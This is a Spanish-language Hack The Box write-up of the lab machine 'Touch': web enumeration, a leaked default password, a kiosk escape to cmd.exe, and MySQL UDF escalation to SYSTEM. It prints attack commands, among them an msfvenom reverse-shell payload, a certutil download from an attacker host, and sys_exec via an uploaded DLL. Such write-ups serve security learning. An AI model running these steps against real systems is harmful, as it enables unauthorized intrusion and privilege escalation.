Hack The Box - Writeup: Touch
Máquina: Touch
Sistema Operativo: Windows Server 2025
Dificultad: Fácil/Media
Puntos clave: Enumeración Web, Exposición de Credenciales, Escape de Kiosco, Abuso de MySQL UDF.

Resumen Ejecutivo
La máquina Touch presenta un escenario corporativo con un servidor Windows exponiendo servicios de administración remota (RDP y WinRM) y un panel web de administración de dispositivos. A través de una enumeración web, descubrí un endpoint de API sin autenticación que revelaba el número de serie del dispositivo, el cual actuaba como contraseña por defecto. Tras acceder al panel, filtré credenciales en el código fuente. El acceso inicial vía RDP me confinó en un entorno de kiosco, del cual escapé abusando de las funcionalidades del navegador. Finalmente, la escalada de privilegios se logró mediante la extracción de credenciales de MySQL en un script de mantenimiento, escalando a SYSTEM mediante la carga de una DLL UDF.

1. Reconocimiento Inicial
Comencé realizando un escaneo de puertos y servicios con nmap para identificar la superficie de ataque:

nmap -p- -sV -sC -T4 -oN nmap_scan.txt <IP_TARGET>

Resultados relevantes:

3389/tcp (RDP): Servicio de Escritorio Remoto.

5985/tcp (WinRM): Windows Remote Management.

8443/tcp (HTTPS): Panel web denominado Nexion DeviceHub.

SO: Windows Server 2025.

Análisis del Panel Web
Al visitar https://<IP_TARGET>:8443, me encontré con una pantalla de inicio de sesión. La interfaz mostraba una pista crítica: "La contraseña por defecto es el número de serie del dispositivo".

Realicé un fuzzing de directorios para encontrar recursos ocultos:

ffuf -u https://<IP_TARGET>:8443/FUZZ -w /usr/share/wordlists/dirb/common.txt -k

Descubrí el endpoint /api/status, el cual era accesible sin autenticación y devolvía un JSON con el estado del dispositivo, incluyendo el número de serie.

Con el número de serie en mano, inicié sesión exitosamente en el panel administrativo.

Obtención de Credenciales
Una vez dentro del panel, inspeccioné el código fuente HTML (F12) y encontré un comentario o variable JavaScript que exponía credenciales en texto plano para el usuario KioskUser.

Nota del autor: Es increíble cómo los desarrolladores a veces dejan credenciales en los comentarios del código pensando que nadie las verá. Siempre reviso el código fuente, los archivos .js y los endpoints de API antes de intentar fuerza bruta.

2. Acceso Inicial y Escape del Kiosco
Conexión RDP
Utilicé las credenciales obtenidas para conectarme vía RDP. Usé xfreerdp3 para aprovechar las últimas características de compatibilidad:

xfreerdp3 /v:<IP_TARGET> /u:KioskUser /p:<PASSWORD> /cert:ignore /dynamic-resolution

Al conectarme, caí directamente en un entorno de kiosco (Kiosk Mode), donde solo tenía acceso al panel de DeviceHub en un navegador bloqueado.

Escape del Kiosco
Para salir de la aplicación restringida, aproveché una funcionalidad del propio panel web:

Desde el panel de Nexion DeviceHub, apagué el escáner de pasaportes (dispositivo periférico).

Esto provocó un error en la aplicación web, mostrando un enlace clicable en el mensaje de error.

Al hacer clic en el enlace, el sistema abrió el navegador Microsoft Edge real (fuera del modo kiosco).

Nota del autor: Este paso me costó un poco. Al principio intenté salir del kiosco con combinaciones de teclas estándar (Alt+F4, Ctrl+Alt+Supr, etc.), pero estaban bloqueadas. La clave fue entender que el panel web controlaba hardware (el escáner) y que apagarlo rompía la aplicación, forzando un fallback al sistema operativo.

Obtención de Shell
Ya con Edge abierto, usé el atajo Ctrl + O (Abrir archivo) y escribí la ruta al símbolo del sistema:

C:\Windows\System32\cmd.exe

Esto me otorgó una shell de comandos interactiva. Desde aquí, pude leer la flag de usuario ubicada en el escritorio de KioskUser.

3. Escalada de Privilegios
Enumeración Local
Buscando archivos de configuración y credenciales, encontré el script refresh-dates.bat en el directorio C:\ProgramData\HTB Airways\.

Al inspeccionar el script, descubrí la contraseña del usuario root de MySQL almacenada en texto plano:

type C:\ProgramData\HTB Airways\refresh-dates.bat

Nota del autor: Siempre reviso C:\ProgramData y C:\Program Files en máquinas Windows. Es común encontrar scripts de mantenimiento o tareas programadas con credenciales hardcodeadas.

Estabilización de la Shell
Para facilitar la explotación de MySQL, decidí obtener una sesión de Meterpreter. Generé un payload con msfvenom:

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP_ATACANTE> LPORT=<PORT> -f exe -o shell.exe

Lo serví con Python:

python3 -m http.server 8000

Y lo descargué en la víctima usando certutil:

certutil -urlcache -split -f http://<IP_ATACANTE>:8000/shell.exe C:\Temp\shell.exe

Ejecuté el payload y capturé la sesión con multi/handler de Metasploit.

Explotación de MySQL (UDF)
Con la contraseña de root de MySQL, me conecté al servicio local. Intenté usar el módulo de Metasploit para UDF (lib_mysqludf_sys.dll), pero falló con el error errno: 126 (generalmente relacionado con dependencias de DLL faltantes o problemas de arquitectura/versión).

Solución alternativa:
Usé la DLL de sqlmap (lib_mysqludf_sys.dll), que es más robusta para este tipo de entornos.

Subí la DLL a la carpeta de plugins de MySQL (C:\MySQL\lib\plugin) usando Meterpreter:

upload /usr/share/sqlmap/data/udf/mysql/windows/64/lib_mysqludf_sys.dll C:\MySQL\lib\plugin\lib_mysqludf_sys.dll

Me conecté a MySQL y creé la función sys_exec:

CREATE FUNCTION sys_exec RETURNS string SONAME 'lib_mysqludf_sys.dll';

Como el servicio de MySQL corría con privilegios de NT AUTHORITY\SYSTEM, pude ejecutar comandos como SYSTEM.

Nota del autor: El error 126 en Windows suele significar "El módulo especificado no se pudo encontrar". En este caso, la DLL de Metasploit dependía de librerías que no estaban en la máquina víctima. La DLL de sqlmap está compilada de forma más estática y funcionó a la primera. Lección aprendida: tener siempre alternativas en el arsenal.

Obtención de la Flag Root
Ejecuté un comando para copiar la flag de root desde su ubicación protegida hacia una carpeta donde tuviera permisos de lectura (por ejemplo, C:\Temp\):

SELECT sys_exec('cmd.exe /c copy C:\Users\Administrator\Desktop\root.txt C:\Temp\root.txt');

Finalmente, desde mi shell de comandos (o Meterpreter), leí la flag:

type C:\Temp\root.txt

Lecciones Aprendidas
Credenciales por defecto y exposición de APIs: Nunca dejes endpoints de diagnóstico (/api/status) sin autenticación, y menos si revelan datos que sirven como credenciales.

Seguridad en Kiosco: Las restricciones de navegador (kiosco) pueden ser evadidas mediante el manejo de errores y funcionalidades del sistema operativo (como Ctrl + O).

Hardcoding de credenciales: Las contraseñas en scripts (.bat) son un riesgo crítico, especialmente si el servicio asociado corre con altos privilegios (SYSTEM).

Flexibilidad en UDF: Cuando una herramienta falla (como el UDF de Metasploit), es bueno tener alternativas (como la DLL de sqlmap) en el arsenal.

Herramientas Utilizadas
nmap

ffuf

xfreerdp3

msfvenom / Metasploit

certutil

sqlmap (DLL UDF)
